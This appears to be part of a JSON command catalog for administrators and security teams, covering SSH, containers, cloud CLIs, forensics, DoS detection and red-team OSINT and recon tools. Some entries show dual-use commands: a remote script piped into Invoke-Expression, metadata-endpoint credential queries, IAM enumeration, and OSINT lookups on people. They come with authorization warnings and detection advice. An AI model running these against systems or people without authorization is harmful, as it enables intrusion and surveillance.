 {"id":"rmt-ssh-socks","cat":"Remote Management","title":"SSH dynamic SOCKS proxy","desc":"Tunnel traffic through a host via a local SOCKS proxy.","tags":["remote","network"],"code":{"ps":"ssh -D {{PORT:1080}} {{USER:admin}}@{{HOST:10.0.0.5}}   # point apps at socks5://127.0.0.1:{{PORT:1080}}","mac":"ssh -D {{PORT:1080}} {{USER:admin}}@{{HOST:10.0.0.5}}   # point apps at socks5://127.0.0.1:{{PORT:1080}}","linux":"ssh -D {{PORT:1080}} {{USER:admin}}@{{HOST:10.0.0.5}}   # point apps at socks5://127.0.0.1:{{PORT:1080}}"}},
 {"id":"rmt-ssh-jump","cat":"Remote Management","title":"SSH through a jump host","desc":"Reach an internal host via a bastion with ProxyJump.","tags":["remote","network"],"code":{"ps":"ssh -J {{JUMP:user@bastion}} {{USER:admin}}@{{HOST:10.0.0.5}}","mac":"ssh -J {{JUMP:user@bastion}} {{USER:admin}}@{{HOST:10.0.0.5}}","linux":"ssh -J {{JUMP:user@bastion}} {{USER:admin}}@{{HOST:10.0.0.5}}"}},
 {"id":"rmt-rdp","cat":"Remote Management","title":"Remote Desktop (RDP)","desc":"Connect to a Windows host over RDP. Linux needs freerdp.","tags":["remote"],"code":{"ps":"mstsc /v:{{HOST:10.0.0.5}}","cmd":"mstsc /v:{{HOST:10.0.0.5}}","mac":"open \"rdp://{{HOST:10.0.0.5}}\"   # or the Microsoft Remote Desktop app","linux":"xfreerdp /v:{{HOST:10.0.0.5}} /u:{{USER:admin}}"}},
 {"id":"rmt-rdp-enable","cat":"Remote Management","title":"Enable RDP (Windows)","desc":"Turn on Remote Desktop and open the firewall.","danger":"Exposes RDP to the network; needs admin. Authorized changes only.","tags":["remote","windows"],"code":{"ps":"Set-ItemProperty 'HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server' -Name fDenyTSConnections -Value 0\nEnable-NetFirewallRule -DisplayGroup 'Remote Desktop'"}},
 {"id":"rmt-winrm-enable","cat":"Remote Management","title":"Enable PowerShell Remoting","desc":"Turn on WinRM/PSRemoting on a Windows host.","danger":"Opens WinRM listeners; needs admin.","tags":["remote","windows"],"code":{"ps":"Enable-PSRemoting -Force"}},
 {"id":"rmt-psremote","cat":"Remote Management","title":"Run commands via PSRemoting","desc":"Execute a script block on remote Windows hosts.","tags":["remote","automation","windows"],"code":{"ps":"Invoke-Command -ComputerName {{HOST:server01}} -ScriptBlock { Get-Service } -Credential (Get-Credential)\n# interactive: Enter-PSSession -ComputerName {{HOST:server01}}"}},
 {"id":"rmt-ansible","cat":"Remote Management","title":"Ansible ad-hoc command","desc":"Run a module/command across an inventory group. Requires ansible.","tags":["remote","automation"],"code":{"linux":"ansible {{GROUP:webservers}} -i {{INVENTORY:hosts.ini}} -m ping\nansible {{GROUP:webservers}} -i {{INVENTORY:hosts.ini}} -a \"uptime\"","mac":"ansible {{GROUP:webservers}} -i {{INVENTORY:hosts.ini}} -m ping"}},
 {"id":"rmt-screen-tmux","cat":"Remote Management","title":"Persistent terminal sessions","desc":"Keep a session alive across disconnects with tmux or screen.","tags":["remote","quick-win"],"code":{"linux":"tmux new -s work    # detach Ctrl-b d ; reattach: tmux attach -t work\nscreen -S work      # detach Ctrl-a d ; reattach: screen -r work","mac":"tmux new -s work    # detach Ctrl-b d ; reattach: tmux attach -t work"}},
 {"id":"rmt-sshfs","cat":"Remote Management","title":"Mount a remote filesystem (SSHFS)","desc":"Mount a remote directory over SSH. Requires sshfs (macFUSE on macOS).","tags":["remote","file-transfer"],"code":{"linux":"sshfs {{USER:admin}}@{{HOST:10.0.0.5}}:{{RPATH:/data}} {{MOUNT:~/mnt}}","mac":"sshfs {{USER:admin}}@{{HOST:10.0.0.5}}:{{RPATH:/data}} {{MOUNT:~/mnt}}"}},
 {"id":"rmt-winrs","cat":"Remote Management","title":"winrs remote command","desc":"Run a single command on a remote Windows host over WinRM.","tags":["remote","windows"],"code":{"cmd":"winrs -r:{{HOST:server01}} ipconfig /all"}},

/* ================= CONTAINERS ================= */
 {"id":"ctr-ps","related":["ctr-exec","ctr-logs","ctr-inspect"],"cat":"Containers","title":"List containers","desc":"Show running and stopped containers. Requires docker or podman.","tags":["containers"],"code":{"ps":"docker ps -a   # podman ps -a","mac":"docker ps -a   # podman ps -a","linux":"docker ps -a   # podman ps -a"}},
 {"id":"ctr-images","cat":"Containers","title":"List images","desc":"Local container images and sizes.","tags":["containers"],"code":{"ps":"docker images","mac":"docker images","linux":"docker images"}},
 {"id":"ctr-run","related":["ctr-exec","ctr-logs"],"cat":"Containers","title":"Run a container","desc":"Start an interactive throwaway container.","tags":["containers"],"code":{"ps":"docker run --rm -it {{IMAGE:alpine}} sh","mac":"docker run --rm -it {{IMAGE:alpine}} sh","linux":"docker run --rm -it {{IMAGE:alpine}} sh"}},
 {"id":"ctr-exec","cat":"Containers","title":"Shell into a running container","desc":"Open a shell inside a running container.","tags":["containers"],"code":{"ps":"docker exec -it {{NAME:web}} sh","mac":"docker exec -it {{NAME:web}} sh","linux":"docker exec -it {{NAME:web}} sh"}},
 {"id":"ctr-logs","cat":"Containers","title":"Container logs","desc":"Follow a container's stdout/stderr.","tags":["containers","logs"],"code":{"ps":"docker logs -f --tail 100 {{NAME:web}}","mac":"docker logs -f --tail 100 {{NAME:web}}","linux":"docker logs -f --tail 100 {{NAME:web}}"}},
 {"id":"ctr-inspect","cat":"Containers","title":"Inspect a container","desc":"Full config, mounts, and network details as JSON.","tags":["containers"],"code":{"ps":"docker inspect {{NAME:web}}","mac":"docker inspect {{NAME:web}}","linux":"docker inspect {{NAME:web}}"}},
 {"id":"ctr-stats","cat":"Containers","title":"Resource usage","desc":"Live CPU/memory/IO per container.","tags":["containers"],"code":{"ps":"docker stats --no-stream","mac":"docker stats --no-stream","linux":"docker stats --no-stream"}},
 {"id":"ctr-stop-rm","cat":"Containers","title":"Stop & remove a container","desc":"Stop then delete a container.","danger":"Removes the container (its writable layer is lost).","tags":["containers"],"code":{"ps":"docker stop {{NAME:web}} && docker rm {{NAME:web}}","mac":"docker stop {{NAME:web}} && docker rm {{NAME:web}}","linux":"docker stop {{NAME:web}} && docker rm {{NAME:web}}"}},
 {"id":"ctr-prune","cat":"Containers","title":"Reclaim disk space","desc":"Remove stopped containers, dangling images, and unused networks.","danger":"Deletes all stopped containers and unused images/networks.","tags":["containers"],"code":{"ps":"docker system prune -a","mac":"docker system prune -a","linux":"docker system prune -a"}},
 {"id":"ctr-cp","cat":"Containers","title":"Copy files in/out","desc":"Copy a file between the host and a container.","tags":["containers","file-transfer"],"code":{"ps":"docker cp {{NAME:web}}:{{RPATH:/etc/nginx/nginx.conf}} ./nginx.conf","mac":"docker cp {{NAME:web}}:{{RPATH:/etc/nginx/nginx.conf}} ./nginx.conf","linux":"docker cp {{NAME:web}}:{{RPATH:/etc/nginx/nginx.conf}} ./nginx.conf"}},
 {"id":"ctr-build","related":["ctr-run","ctr-compose"],"cat":"Containers","title":"Build an image","desc":"Build an image from a Dockerfile in the context dir.","tags":["containers"],"code":{"ps":"docker build -t {{TAG:myapp:latest}} {{CONTEXT:.}}","mac":"docker build -t {{TAG:myapp:latest}} {{CONTEXT:.}}","linux":"docker build -t {{TAG:myapp:latest}} {{CONTEXT:.}}"}},
 {"id":"ctr-compose","cat":"Containers","title":"Docker Compose up / down","desc":"Start or stop a multi-container stack.","tags":["containers"],"code":{"ps":"docker compose up -d   # tear down: docker compose down","mac":"docker compose up -d   # tear down: docker compose down","linux":"docker compose up -d   # tear down: docker compose down"}},
 {"id":"ctr-diff","cat":"Containers","title":"Files changed in a container","desc":"Show filesystem changes vs the image — useful in IR to spot tampering.","tags":["containers","incident-response"],"code":{"ps":"docker diff {{NAME:web}}","mac":"docker diff {{NAME:web}}","linux":"docker diff {{NAME:web}}"}},
 {"id":"ctr-history","cat":"Containers","title":"Image layer history","desc":"See how an image was built, layer by layer.","tags":["containers"],"code":{"ps":"docker history {{IMAGE:alpine}}","mac":"docker history {{IMAGE:alpine}}","linux":"docker history {{IMAGE:alpine}}"}},
 {"id":"ctr-k8s-get","related":["ctr-k8s-logs","ctr-k8s-describe","ctr-k8s-exec"],"cat":"Containers","title":"kubectl: list resources","desc":"List pods/nodes/services across namespaces. Requires kubectl.","tags":["containers"],"code":{"ps":"kubectl get pods -A   # also: nodes, svc, deploy","mac":"kubectl get pods -A   # also: nodes, svc, deploy","linux":"kubectl get pods -A   # also: nodes, svc, deploy"}},
 {"id":"ctr-k8s-logs","cat":"Containers","title":"kubectl: pod logs","desc":"Follow logs from a pod.","tags":["containers","logs"],"code":{"ps":"kubectl logs -f {{POD:mypod}} -n {{NS:default}}","mac":"kubectl logs -f {{POD:mypod}} -n {{NS:default}}","linux":"kubectl logs -f {{POD:mypod}} -n {{NS:default}}"}},
 {"id":"ctr-k8s-exec","cat":"Containers","title":"kubectl: exec into a pod","desc":"Open a shell in a pod's container.","tags":["containers"],"code":{"ps":"kubectl exec -it {{POD:mypod}} -n {{NS:default}} -- sh","mac":"kubectl exec -it {{POD:mypod}} -n {{NS:default}} -- sh","linux":"kubectl exec -it {{POD:mypod}} -n {{NS:default}} -- sh"}},
 {"id":"ctr-k8s-describe","cat":"Containers","title":"kubectl: describe a resource","desc":"Detailed status/events for a pod or other object.","tags":["containers"],"code":{"ps":"kubectl describe pod {{POD:mypod}} -n {{NS:default}}","mac":"kubectl describe pod {{POD:mypod}} -n {{NS:default}}","linux":"kubectl describe pod {{POD:mypod}} -n {{NS:default}}"}},

/* ================= CLOUD CLI ================= */
 {"id":"cld-aws-whoami","cat":"Cloud CLI","title":"AWS: who am I","desc":"Show the current AWS caller identity. Requires the aws CLI.","tags":["cloud","account"],"code":{"ps":"aws sts get-caller-identity","mac":"aws sts get-caller-identity","linux":"aws sts get-caller-identity"}},
 {"id":"cld-az-whoami","cat":"Cloud CLI","title":"Azure: current account","desc":"Show the active Azure subscription/account. Requires the az CLI.","tags":["cloud","account"],"code":{"ps":"az account show","mac":"az account show","linux":"az account show"}},
 {"id":"cld-gcp-whoami","cat":"Cloud CLI","title":"GCP: active identity","desc":"Show authenticated accounts and config. Requires gcloud.","tags":["cloud","account"],"code":{"ps":"gcloud auth list; gcloud config list","mac":"gcloud auth list; gcloud config list","linux":"gcloud auth list; gcloud config list"}},
 {"id":"cld-aws-s3-list","cat":"Cloud CLI","title":"AWS: list S3 buckets/objects","desc":"List buckets, or objects within one.","tags":["cloud"],"code":{"ps":"aws s3 ls   # objects: aws s3 ls s3://{{BUCKET:my-bucket}}","mac":"aws s3 ls   # objects: aws s3 ls s3://{{BUCKET:my-bucket}}","linux":"aws s3 ls   # objects: aws s3 ls s3://{{BUCKET:my-bucket}}"}},
 {"id":"cld-aws-s3-public","cat":"Cloud CLI","title":"AWS: check bucket public access","desc":"Inspect a bucket's ACL and public-access-block settings.","danger":"Authorized cloud assessments only.","team":"red","tags":["cloud","enumeration"],"attack":["T1580"],"detect":"CloudTrail GetBucketAcl / GetPublicAccessBlock reads, especially from an unusual principal.","mitigate":"Enable S3 Block Public Access org-wide; least-privilege IAM; alert on ACL reads.","code":{"ps":"aws s3api get-bucket-acl --bucket {{BUCKET:my-bucket}}\naws s3api get-public-access-block --bucket {{BUCKET:my-bucket}}","mac":"aws s3api get-bucket-acl --bucket {{BUCKET:my-bucket}}\naws s3api get-public-access-block --bucket {{BUCKET:my-bucket}}","linux":"aws s3api get-bucket-acl --bucket {{BUCKET:my-bucket}}\naws s3api get-public-access-block --bucket {{BUCKET:my-bucket}}"}},
 {"id":"cld-aws-ec2-list","cat":"Cloud CLI","title":"AWS: list EC2 instances","desc":"Instance IDs, state, and public IPs.","tags":["cloud","network"],"code":{"ps":"aws ec2 describe-instances --query \"Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress]\" --output table","mac":"aws ec2 describe-instances --query \"Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress]\" --output table","linux":"aws ec2 describe-instances --query \"Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress]\" --output table"}},
 {"id":"cld-aws-iam-enum","cat":"Cloud CLI","title":"AWS: enumerate IAM","desc":"List IAM users and roles.","danger":"Authorized cloud assessments only.","team":"red","tags":["cloud","enumeration","account"],"attack":["T1087.004"],"detect":"CloudTrail ListUsers/ListRoles/ListPolicies from an unusual principal or spike.","mitigate":"Least privilege; deny broad iam:List*; alert on IAM enumeration.","code":{"ps":"aws iam list-users\naws iam list-roles --query \"Roles[].RoleName\"","mac":"aws iam list-users\naws iam list-roles --query \"Roles[].RoleName\"","linux":"aws iam list-users\naws iam list-roles --query \"Roles[].RoleName\""}},
 {"id":"cld-aws-keys","cat":"Cloud CLI","title":"AWS: access keys for a user","desc":"List a user's access key IDs and status.","tags":["cloud","account"],"code":{"ps":"aws iam list-access-keys --user-name {{USER:alice}}","mac":"aws iam list-access-keys --user-name {{USER:alice}}","linux":"aws iam list-access-keys --user-name {{USER:alice}}"}},
 {"id":"cld-metadata","cat":"Cloud CLI","title":"Cloud instance metadata (IMDS)","desc":"Query the instance metadata service — a common SSRF/credential target.","danger":"Authorized cloud assessments only.","team":"red","tags":["cloud","account"],"attack":["T1552.005"],"detect":"Access to 169.254.169.254 from web/proxy workloads; IMDSv1 usage where v2 is expected.","mitigate":"Enforce IMDSv2 (hop-limit 1); block metadata from containers/reverse proxies.","code":{"ps":"curl -s http://169.254.169.254/latest/meta-data/   # AWS IMDSv1\n# IMDSv2:\nTOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/","mac":"curl -s http://169.254.169.254/latest/meta-data/   # AWS IMDSv1\n# IMDSv2:\nTOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/","linux":"curl -s http://169.254.169.254/latest/meta-data/   # AWS IMDSv1\n# IMDSv2:\nTOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/"}},
 {"id":"cld-az-resources","cat":"Cloud CLI","title":"Azure: list resources","desc":"All resources in the current subscription.","tags":["cloud"],"code":{"ps":"az resource list --output table","mac":"az resource list --output table","linux":"az resource list --output table"}},
 {"id":"cld-az-vm-list","cat":"Cloud CLI","title":"Azure: list VMs","desc":"Virtual machines with power state.","tags":["cloud","network"],"code":{"ps":"az vm list -d --output table","mac":"az vm list -d --output table","linux":"az vm list -d --output table"}},
 {"id":"cld-gcp-list","cat":"Cloud CLI","title":"GCP: projects & instances","desc":"List projects and Compute Engine instances.","tags":["cloud","network"],"code":{"ps":"gcloud projects list\ngcloud compute instances list","mac":"gcloud projects list\ngcloud compute instances list","linux":"gcloud projects list\ngcloud compute instances list"}},
 {"id":"cld-aws-cloudtrail","cat":"Cloud CLI","title":"AWS: recent CloudTrail events","desc":"Look up recent management-plane API activity for IR.","team":"blue","tags":["cloud","logs","incident-response"],"code":{"ps":"aws cloudtrail lookup-events --max-results 20 --query \"Events[].[EventTime,Username,EventName]\" --output table","mac":"aws cloudtrail lookup-events --max-results 20 --query \"Events[].[EventTime,Username,EventName]\" --output table","linux":"aws cloudtrail lookup-events --max-results 20 --query \"Events[].[EventTime,Username,EventName]\" --output table"}},
 {"id":"cld-aws-logs","cat":"Cloud CLI","title":"AWS: tail CloudWatch logs","desc":"Follow a log group live.","team":"blue","tags":["cloud","logs"],"code":{"ps":"aws logs tail {{GROUP:/aws/lambda/myfn}} --follow","mac":"aws logs tail {{GROUP:/aws/lambda/myfn}} --follow","linux":"aws logs tail {{GROUP:/aws/lambda/myfn}} --follow"}},
 {"id":"cld-az-activity","cat":"Cloud CLI","title":"Azure: activity log","desc":"Recent subscription activity for auditing/IR.","team":"blue","tags":["cloud","logs","incident-response"],"code":{"ps":"az monitor activity-log list --max-events 20 --output table","mac":"az monitor activity-log list --max-events 20 --output table","linux":"az monitor activity-log list --max-events 20 --output table"}},
 {"id":"for-extract-ipv4","cat":"Forensics","title":"Extract IPv4 addresses from text files -> CSV","desc":"Regex-scan every .txt in a folder for IPv4 addresses and export the unique results (with source filename) to a CSV.","danger":"Writes the output CSV to the working directory (overwrites an existing file of that name).","tags":["forensics","regex","network"],"code":{"ps":"$pattern = '\\b(?:(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\b'\n\n$result = foreach ($file in Get-ChildItem -Path {{PATH:.}} -Filter *.txt) {\n    Select-String -Path $file.FullName -Pattern $pattern -AllMatches | ForEach-Object {\n        foreach ($match in $_.Matches) {\n            [PSCustomObject]@{\n                File = $file.Name\n                IP   = $match.Value\n            }\n        }\n    }\n}\n\n$result | Sort-Object IP -Unique | Export-Csv \"{{OUTPUT:IPs_With_Files.csv}}\" -NoTypeInformation\n\nWrite-Host \"Results saved to {{OUTPUT:IPs_With_Files.csv}}\""}},
 {"id":"for-extract-ipv4-json","cat":"Forensics","title":"Extract IPv4 addresses from JSON files -> list","desc":"Regex-scan every .json in a folder for IPv4 addresses and save the unique addresses to a text file.","danger":"Writes the output text file to the working directory (overwrites an existing file of that name).","tags":["forensics","regex","network"],"code":{"ps":"# IPv4 regular expression\n$Pattern = '\\b(?:(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\b'\n\n# Extract IPs from all JSON files in the folder\n$IPs = Get-ChildItem -Path {{PATH:.}} -Filter *.json |\n    Select-String -Pattern $Pattern -AllMatches |\n    ForEach-Object { $_.Matches.Value } |\n    Sort-Object -Unique\n\n# Save the results\n$IPs | Set-Content \"{{OUTPUT:Extracted_IPs.txt}}\"\n\nWrite-Host \"Found $($IPs.Count) unique IPv4 addresses.\"\nWrite-Host \"Results saved to {{OUTPUT:Extracted_IPs.txt}}\""}},
 {"id":"for-dd-image","cat":"Forensics","team":"blue","title":"Forensic disk/partition image (dd)","desc":"Create a byte-for-byte raw image of a disk or partition with dd, then hash it to prove integrity. Work from a write-blocked source and write to separate media.","danger":"Runs as root against raw devices; a wrong 'of=' target overwrites data irrecoverably. Verify source vs destination before running.","tags":["forensics","recovery"],"code":{"linux":"# image a disk, keep reading past bad sectors, show progress:\nsudo dd if={{SRC:/dev/sdb}} of={{OUT:disk.img}} bs=4M conv=noerror,sync status=progress\nsha256sum {{OUT:disk.img}} | tee disk.img.sha256","mac":"# macOS: list disks with 'diskutil list'; raw rdiskN is faster\nsudo dd if={{SRC:/dev/rdisk2}} of={{OUT:disk.img}} bs=4m\nshasum -a 256 {{OUT:disk.img}} | tee disk.img.sha256"}},
 {"id":"for-memdump","cat":"Forensics","team":"blue","title":"Capture RAM (memdump / AVML)","desc":"Acquire volatile memory to a file for offline analysis (Volatility, strings). memdump reads /dev/mem and is often blocked on hardened kernels - AVML is the reliable modern option. Save to external media.","danger":"Requires root. Capture to a separate disk/USB so you don't overwrite unallocated space; acquisition itself perturbs memory.","tags":["forensics","memory"],"code":{"linux":"# classic memdump (may be blocked by kernel lockdown):\nsudo memdump > {{OUT:mem.dump}}\n# reliable on modern kernels (Microsoft AVML, static binary):\nsudo ./avml {{OUT:mem.lime}}\n# Windows: WinPmem or DumpIt   macOS: AVML"}},
 {"id":"tool-winhex","cat":"Forensics","title":"WinHex (X-Ways) - hex, disk & RAM editor","desc":"Universal hex editor and disk/RAM editor built for computer forensics and data recovery: inspect and edit files, disks, and memory, interpret file systems, and carve/recover data. Runs in a reduced evaluation mode until licensed.","url":"https://www.x-ways.net/winhex/","license":"Proprietary (X-Ways; free evaluation, tiered paid licenses)","platforms":["windows"],"tags":["forensics","recovery"],"install":{"cmd":"winget install X-Ways.WinHex"}},
 {"id":"tool-winutil","cat":"Tools","title":"WinUtil - Windows debloat & tweaks (Chris Titus Tech)","desc":"Open-source PowerShell GUI to debloat Windows, apply tweaks, and install apps. Launch from an ELEVATED PowerShell.","danger":"Pipes a remote script straight into Invoke-Expression and makes system changes - review the source (github.com/ChrisTitusTech/winutil) before running; run elevated.","url":"https://github.com/ChrisTitusTech/winutil","license":"MIT","platforms":["windows"],"tags":["windows","automation"],"install":{"cmd":"irm christitus.com/win | iex"}},

/* --- DoS detection & mitigation (added) --- */
 {"id":"det-dos-synflood","cat":"Detection Engineering","title":"Detect & mitigate SYN flood","desc":"Spot and blunt a TCP SYN flood (half-open connection exhaustion).","danger":"Mitigation changes kernel/firewall settings; run elevated.","team":"blue","tags":["detection","network"],"attack":["T1498"],"detect":"Many connections stuck in SYN_RECV; SYN rate far exceeds completed handshakes; one or spoofed sources hammering a port.","mitigate":"Enable SYN cookies; raise the SYN backlog; rate-limit new SYNs at the firewall; front with upstream scrubbing/CDN.","code":{"linux":"# --- detect ---\nss -s | grep -i syn                     # summary counters\nss -tan state syn-recv | wc -l          # count half-open connections\nsudo tcpdump -ni {{IFACE:eth0}} 'tcp[tcpflags] == tcp-syn' -c 50\n# --- mitigate (root) ---\nsudo sysctl -w net.ipv4.tcp_syncookies=1\nsudo sysctl -w net.ipv4.tcp_max_syn_backlog=4096\nsudo nft add rule inet filter input tcp flags syn limit rate 50/second accept","ps":"# --- detect ---\n(Get-NetTCPConnection -State SynReceived -ErrorAction SilentlyContinue).Count\nnetstat -ano -p tcp | Select-String \"SYN_RECEIVED\" | Measure-Object\n# --- mitigate ---\n# Ensure firewall/edge connection rate-limits are set; front with a DDoS-scrubbing service."}},
 {"id":"det-dos-udpflood","cat":"Detection Engineering","title":"Detect & mitigate UDP flood","desc":"Spot and rate-limit a UDP flood saturating a host or link.","danger":"Mitigation changes firewall settings; run elevated.","team":"blue","tags":["detection","network"],"attack":["T1498"],"detect":"UDP packets-per-second / bandwidth spike toward a host or port; bursts of ICMP port-unreachable replies from the victim.","mitigate":"Rate-limit or drop unneeded UDP at the edge; add capacity; use upstream scrubbing for volumetric attacks.","code":{"linux":"# --- detect ---\nsudo tcpdump -ni {{IFACE:eth0}} udp -c 50\nss -u -a | wc -l\nsudo iftop -i {{IFACE:eth0}} 2>/dev/null    # per-host bandwidth (dep: iftop)\n# --- mitigate (root) ---\nsudo nft add rule inet filter input udp limit rate over 100/second drop"}},
 {"id":"det-dos-icmpflood","cat":"Detection Engineering","title":"Detect & mitigate ICMP (ping) flood","desc":"Spot and rate-limit an ICMP echo flood (incl. oversized pings).","danger":"Mitigation limits/drops ICMP; run elevated. Don't fully block ICMP (breaks path-MTU discovery).","team":"blue","tags":["detection","network"],"attack":["T1498"],"detect":"High ICMP echo-request rate, often oversized/fragmented packets, from one or many sources.","mitigate":"Rate-limit ICMP at the edge; ignore broadcast echo (smurf); drop oversized pings — but keep enough ICMP for PMTUD.","code":{"linux":"# --- detect ---\nsudo tcpdump -ni {{IFACE:eth0}} icmp -c 50\n# --- mitigate (root) ---\nsudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1\nsudo nft add rule inet filter input icmp type echo-request limit rate over 20/second drop"}},
 {"id":"det-dos-slowloris","cat":"Detection Engineering","title":"Detect & mitigate Slowloris / slow-HTTP","desc":"Spot and defend against slow-HTTP DoS that holds many partial connections open. (Technique PoC: github.com/gkbrk/slowloris.)","danger":"Mitigation changes web-server config; test before applying in production.","team":"blue","tags":["detection","web"],"attack":["T1499.002"],"detect":"Many concurrent connections from a few client IPs held open with partial/slow requests; high connection count but low request throughput; web workers stuck in the reading state.","mitigate":"Set aggressive header/body read timeouts and per-IP connection limits; use Apache mod_reqtimeout / nginx limit_conn; front with a reverse proxy or CDN.","code":{"linux":"# --- detect: connections per client IP to the web ports ---\nss -tan '( dport = :80 or dport = :443 )' | awk 'NR>1{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head\n# Apache scoreboard: workers stuck in R (Reading):\napachectl fullstatus 2>/dev/null | grep -iE 'reading|requests currently'\n# --- mitigate ---\n# nginx:  limit_conn_zone $binary_remote_addr zone=perip:10m;  limit_conn perip 20;\n#         client_header_timeout 5s;  client_body_timeout 5s;\n# Apache: enable mod_reqtimeout ->  RequestReadTimeout header=5 body=10"}},
 {"id":"tool-hping3","cat":"Tools","title":"hping3 - TCP/IP packet crafter","desc":"Craft custom TCP/UDP/ICMP/raw-IP packets for firewall/ACL testing, port probing, path-MTU discovery, and traceroute. Dual-use: also abusable for network floods (see the DoS detection entries).","url":"https://github.com/antirez/hping","license":"GPLv2","platforms":["linux","macos"],"tags":["network","tools"],"attack":["T1498"],"install":{"linux":"sudo apt install hping3"}},

/* --- tool install + usage (added) --- */
 {"id":"osint-maigret","cat":"OSINT","title":"Maigret - username OSINT (2500+ sites)","desc":"Find accounts tied to a username across thousands of sites. Requires Python (pipx recommended).","danger":"OSINT - scope to authorized engagements; queries third-party sites, not the target.","team":"red","tags":["osint","account"],"attack":["T1593.001"],"detect":"Passive - invisible to the target; reduce exposure by not reusing sensitive usernames.","mitigate":"Use distinct handles for sensitive accounts; monitor for impersonation.","code":{"linux":"pipx install maigret   # or: pip install maigret\nmaigret {{USERNAME:johndoe}}","mac":"pipx install maigret\nmaigret {{USERNAME:johndoe}}","ps":"pip install maigret\nmaigret {{USERNAME:johndoe}}"}},
 {"id":"osint-holehe","cat":"OSINT","title":"Holehe - email account discovery","desc":"Check which sites an email is registered on via signup/reset responses. Requires Python.","danger":"OSINT - authorized engagements only; queries third-party sites.","team":"red","tags":["osint","mail","account"],"attack":["T1589.002"],"detect":"Passive to the target; the queried sites may log password-reset probes.","mitigate":"Limit public exposure of employee emails; user awareness.","code":{"linux":"pipx install holehe\nholehe {{EMAIL:target@example.com}}","mac":"pipx install holehe\nholehe {{EMAIL:target@example.com}}","ps":"pip install holehe\nholehe {{EMAIL:target@example.com}}"}},
 {"id":"osint-blackbird","cat":"OSINT","title":"Blackbird - username/email OSINT","desc":"Search a username or email across many sites. Clone from GitHub; requires Python.","danger":"OSINT - authorized engagements only.","team":"red","tags":["osint","account"],"attack":["T1593.001"],"detect":"Passive - invisible to the target.","mitigate":"Use distinct handles; minimize public footprint.","code":{"linux":"git clone https://github.com/p1ngul1n0/blackbird\ncd blackbird && pip install -r requirements.txt\npython blackbird.py -u {{USERNAME:johndoe}}","mac":"git clone https://github.com/p1ngul1n0/blackbird\ncd blackbird && pip install -r requirements.txt\npython3 blackbird.py -u {{USERNAME:johndoe}}"}},
 {"id":"web-seclists","cat":"Web App Testing","title":"SecLists - wordlist collection","desc":"The tester's companion: wordlists for discovery, fuzzing, passwords, and payloads. Install once, point your tools at it.","danger":"Authorized testing only.","team":"red","tags":["web","password","scanning"],"attack":["T1595.003"],"detect":"The tool USING these lists is what's detectable (404/403 floods), not the lists.","mitigate":"Rate-limit; WAF; monitor content-discovery patterns.","code":{"linux":"sudo apt install seclists 2>/dev/null || git clone https://github.com/danielmiessler/SecLists /usr/share/seclists\n# example use with ffuf:\nffuf -u http://{{TARGET:10.0.0.5}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt","mac":"brew install seclists 2>/dev/null || git clone https://github.com/danielmiessler/SecLists\nffuf -u http://{{TARGET:10.0.0.5}}/FUZZ -w SecLists/Discovery/Web-Content/common.txt"}},
 {"id":"recon-nmap-vulners","cat":"Reconnaissance","title":"nmap-vulners - CVE detection NSE","desc":"nmap NSE script mapping detected service versions to known CVEs (Vulners DB). Requires nmap + internet.","danger":"Authorized targets only; active version/vuln scan.","team":"red","tags":["recon","scanning","detection"],"attack":["T1595.002"],"detect":"Version probes plus outbound lookups to vulners.com; IDS vuln-scan signatures.","mitigate":"Patch; virtual-patch at a WAF; alert on scanner signatures.","code":{"linux":"sudo git clone https://github.com/vulnersCom/nmap-vulners /usr/share/nmap/scripts/nmap-vulners\nsudo nmap --script-updatedb\nnmap -sV --script vulners {{TARGET:10.0.0.5}}","mac":"git clone https://github.com/vulnersCom/nmap-vulners \"$(brew --prefix)/share/nmap/scripts/nmap-vulners\"\nnmap -sV --script vulners {{TARGET:10.0.0.5}}"}},
 {"id":"recon-sn1per","cat":"Reconnaissance","title":"Sn1per - automated recon framework","desc":"Orchestrates many tools to automate recon/enumeration. Aggressive - authorized scopes only. Requires git + Linux.","danger":"High-volume automated scanning; authorized engagements only. Run from a lab/VM.","team":"red","tags":["recon","scanning","enumeration"],"attack":["T1595"],"detect":"Bursts of many tools' traffic from one source; IDS multi-signature scan alerts.","mitigate":"Rate-limit; segment; alert on multi-vector scanning from a single host.","code":{"linux":"git clone https://github.com/1N3/Sn1per\ncd Sn1per && sudo bash install.sh\n# basic recon on ONE authorized target:\nsniper -t {{TARGET:example.com}} -m stealth"}},
 {"id":"rmt-tacticalrmm","cat":"Remote Management","title":"Tactical RMM - self-hosted RMM","desc":"Open-source remote monitoring & management (agents, scripts, alerts) for fleets. Self-hosted server, not a run-in-place CLI. Note: RMM tools are also abused by attackers for persistence (worth detecting).","team":"blue","tags":["remote","automation"],"code":{"linux":"# Deploy on a FRESH Ubuntu LTS server (or Docker). Review the installer first:\nwget https://raw.githubusercontent.com/amidaware/tacticalrmm/master/install.sh\n# then follow docs.tacticalrmm.com  ->  sudo bash install.sh"}},
